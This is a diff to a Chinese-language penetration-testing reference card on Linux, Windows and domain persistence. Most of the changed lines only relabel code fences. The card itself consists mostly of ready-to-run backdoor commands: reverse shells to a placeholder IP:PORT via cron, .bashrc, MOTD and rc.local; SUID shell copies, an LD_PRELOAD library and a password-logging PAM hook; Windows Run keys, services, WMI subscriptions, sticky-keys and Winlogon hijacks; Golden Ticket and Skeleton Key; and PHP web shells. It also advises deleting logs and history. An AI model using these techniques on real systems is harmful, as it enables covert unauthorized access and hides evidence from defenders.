@@ -11,13 +11,13 @@ metadata: { domain: linux, tier: T1 }
 
 ## 0. 持久化原则
 
-```
+```text
 [ ] 最少 2 条独立路径（一条挂了另一条救）
 [ ] 不同类型（避免同一检测规则覆盖全部）
 [ ] 不破坏系统（别改关键文件导致系统不稳定）
 [ ] 清理痕迹（删除命令历史/日志）
 [ ] 定时回连 (cron/schtasks) > 被动等待
-```
+```text
 
 ---
 
@@ -25,7 +25,7 @@ metadata: { domain: linux, tier: T1 }
 
 ### 1.1 SSH Key 🔴 最简洁
 
-```
+```text
 # 生成 key
 ssh-keygen -t rsa -b 4096 -f ./id_rsa -N ""
 
@@ -36,11 +36,11 @@ chmod 600 /home/user/.ssh/authorized_keys
 
 # 验证
 ssh -i id_rsa user@target
-```
+```text
 
 ### 1.2 Cron Job
 
-```
+```text
 # 用户 cron (🔴 用 /bin/bash 非 /bin/sh — /dev/tcp 需 bash)
 # 🔴 追加而非覆盖: (crontab -l 2>/dev/null; echo "...") | crontab -
 (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'") | crontab -
@@ -53,7 +53,7 @@ echo "*/5 * * * * root /tmp/.persist.sh" > /etc/cron.d/system-update
 
 # @reboot
 echo "@reboot root /tmp/.persist.sh" >> /etc/crontab
-```
+```text
 
 ### 1.3 Systemd Service
 
@@ -71,26 +71,26 @@ RestartSec=60
 
 [Install]
 WantedBy=multi-user.target
-```
+```text
 
-```
+```bash
 systemctl enable systemd-update.service
 systemctl start systemd-update.service
-```
+```text
 
 ### 1.4 .bashrc / .profile
 
-```
+```text
 # 用户登录时触发
 echo 'nohup bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> ~/.bashrc
 echo 'alias sudo="/var/tmp/.hidden"' >> ~/.bashrc   # 🔴 不用 /tmp
 echo "PAYLOAD" >> ~/.profile
 echo "PAYLOAD" >> /etc/profile
-```
+```text
 
 ### 1.5 SUID/SGID 后门
 
-```
+```text
 # 给 shell 设 SUID
 cp /bin/bash /var/tmp/.bash      # 🔴 不用 /tmp (重启/定时清理可能丢失)
 chmod 4755 /var/tmp/.bash
@@ -99,11 +99,11 @@ chmod 4755 /var/tmp/.bash
 # 给 Python 设 SUID (如果有)
 cp /usr/bin/python3 /var/tmp/.py     # 🔴 不用 /tmp
 chmod 4755 /var/tmp/.py
-```
+```text
 
 ### 1.6 LD_PRELOAD 后门
 
-```
+```text
 # ① 先编译恶意 .so
 echo '#include <stdlib.h>
 void __attribute__((constructor)) init() {
@@ -115,11 +115,11 @@ gcc -shared -fPIC /tmp/evil.c -o /var/tmp/evil.so
 # ② 写入 ld.so.preload → 所有新进程加载此 .so → root shell
 echo "/var/tmp/evil.so" > /etc/ld.so.preload
 # 🔴 重启或新 SSH 连接即触发 — 每次进程启动都执行
-```
+```text
 
 ### 1.7 PAM 后门
 
-```
+```text
 # 方法: pam_exec.so — 认证时执行任意命令
 # 在 /etc/pam.d/common-auth (Debian) 或 /etc/pam.d/sshd 末尾加:
 auth    optional    pam_exec.so    /var/tmp/pam_trigger.sh
@@ -128,24 +128,24 @@ auth    optional    pam_exec.so    /var/tmp/pam_trigger.sh
 # 🔴 每次 SSH 密码认证成功触发，不登录也触发
 
 # 更隐蔽: 备份原 pam_unix.so → 编译修改版 → 返回成功 + 记录密码
-```
+```text
 
 ### 1.8 MOTD 后门 (SSH 登录触发)
-```
+```text
 # Debian/Ubuntu: /etc/update-motd.d/ 脚本在每次 SSH 登录时以 root 执行
 # 所有脚本按数字顺序执行 → 选一个不显眼的数字
 echo '#!/bin/bash' > /etc/update-motd.d/99-sys-check
 echo 'nohup bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> /etc/update-motd.d/99-sys-check
 chmod +x /etc/update-motd.d/99-sys-check
 # 🔴 关键: nohup + & 确保不阻塞 SSH 登录 → 不引起怀疑
-```
+```text
 
 ### 1.9 rc.local 后门 (开机启动)
-```
+```text
 # /etc/rc.local 在启动最后阶段以 root 执行
 echo '/bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> /etc/rc.local
 # 🔴 systemd 系统中 rc.local 可能被禁用 → 先启用: systemctl enable rc-local
-```
+```text
 
 ---
 
@@ -153,17 +153,17 @@ echo '/bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> /etc/rc.local
 
 ### 2.1 计划任务
 
-```
+```text
 # 创建隐藏计划任务
 schtasks /create /tn "SystemUpdate" /tr "powershell -enc <B64>" /sc hourly /mo 1 /ru SYSTEM /f
 
 # XML 导入（更隐蔽）
 # 导出任务 → 修改 XML → schtasks /create /tn "Task" /xml task.xml /f
-```
+```text
 
 ### 2.2 注册表 Run Keys
 
-```
+```text
 # HKCU (当前用户)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
 
@@ -174,11 +174,11 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ
 HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
 HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
-```
+```text
 
 ### 2.3 服务
 
-```
+```text
 # 创建新服务
 sc create "SystemUpdate" binPath= "C:\Windows\Temp\payload.exe" start= auto
 sc start "SystemUpdate"
@@ -186,10 +186,10 @@ sc start "SystemUpdate"
 # 劫持已有服务
 sc config <ServiceName> binPath= "C:\Windows\Temp\payload.exe"
 sc start <ServiceName>
-```
+```text
 
 ### 2.4 WMI Event Subscription 🔴 最隐蔽
-```
+```text
 # 原生 PowerShell (无需 PowerSploit) — SYSTEM 权限 + 文件落地零
 $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
   Name='SysCheck'; EventNamespace='root/cimv2'; QueryLanguage='WQL'
@@ -203,35 +203,35 @@ Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -A
 }
 # 🔴 触发时机: 系统启动后 200-320 秒 (SystemUpTime)
 # 🔴 清理痕迹: Get-WmiObject -Namespace root/subscription -Class __EventFilter | Remove-WmiObject
-```
+```text
 
 ### 2.5 启动文件夹
 
-```
+```text
 # 当前用户
 copy payload.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 # 所有用户
 copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
-```
+```text
 
 ### 2.6 DLL 劫持持久化
 
-```
+```text
 # 找缺失 DLL 路径 → 放置恶意 DLL → 每次启动触发
 # 常见目标: OneDrive / Teams / Cortana 等自启动应用的缺失 DLL
-```
+```text
 （详见 dll-hijacking-practical 卡）
 
 ### 2.7 COM Hijacking
 
-```
+```text
 # 劫持 COM 对象注册 → 合法程序加载时触发
 # 修改 HKCR\CLSID\{...}\InprocServer32 指向恶意 DLL
-```
+```text
 
 ### 2.8 Accessibility 后门 (Sticky Keys)
-```
+```text
 # 替换 sethc.exe (粘滞键) 或 utilman.exe (轻松访问) 为 cmd.exe
 # 在登录界面按 5 次 Shift → SYSTEM 权限的 cmd
 takeown /f C:\Windows\System32\sethc.exe
@@ -243,28 +243,28 @@ takeown /f C:\Windows\System32\utilman.exe
 icacls C:\Windows\System32\utilman.exe /grant Everyone:F
 copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 # 🔴 RDP 登录界面也有效 — 远程触发
-```
+```text
 
 ### 2.9 Winlogon 劫持
-```
+```text
 # Userinit — 用户登录时以 SYSTEM 执行 (在 explorer 之前)
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\p.exe" /f
 
 # Shell — 替换默认 shell (explorer.exe)
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\Windows\Temp\p.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Windows\Temp\p.exe" /f
 # 🔴 高风险: Userinit 出错 → 用户无法登录！备份原值再改
-```
+```text
 
 ### 2.10 域持久化
 
-```
+```text
 # Golden Ticket → krbtgt hash → 无限期 TGT
 # Silver Ticket → 服务账户 hash → 特定服务 TGS
 # Skeleton Key → LSASS 注入 → 任何密码都通过
 - 🆕 AdminSDHolder → adminsdholder-abuse — 添加 ACE → SDProp 自动传播到所有受保护组
 # DCShadow → 临时 DC → 推恶意属性（详见 dcshadow 卡）
 # DSRM 密码 → 恢复模式 DA（详见 dsrm-credentials 卡）
-```
+```text
 
 （SID History 见 sid-history-injection，RODC 见 rodc-privesc-chain，横向移动见 lateral-movement 卡）
 
@@ -272,7 +272,7 @@ reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t
 
 ## 3. Web Shell 持久化
 
-```
+```text
 # PHP
 <?php system($_GET['c']);?>
 
@@ -288,13 +288,13 @@ GIF89a;<?php system($_GET['c']);?>
 
 # 嵌入已有文件
 echo '<?php system($_GET["c"]);?>' >> wp-includes/functions.php
-```
+```text
 
 ---
 
 ## 快速决策树
 
-```
+```text
 Linux:
   有 SSH?     → SSH Key (最简洁)
   有 cron?    → Crontab 反弹 shell (追加之!)
@@ -306,7 +306,7 @@ Windows:
   是 Admin?   → 注册表 Run / WMI / Winlogon / Accessibility
   普通用户?   → HKCU Run / 启动文件夹
   域环境?     → Golden Ticket / AdminSDHolder / DSRM
-```
+```text
 
 ## 反模式
 
